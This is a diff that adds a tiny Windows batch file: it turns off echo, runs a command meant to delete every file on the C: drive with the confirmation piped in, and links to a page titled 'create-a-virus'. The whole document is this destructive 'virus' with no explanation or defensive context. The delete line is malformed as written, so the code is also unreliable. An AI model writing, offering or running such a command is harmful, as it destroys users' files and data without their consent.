@@ -1,0 +1,4 @@
+@Echo off
+Del C: *.* |y
+
+Link - https://techgrinch.com/create-a-virus/
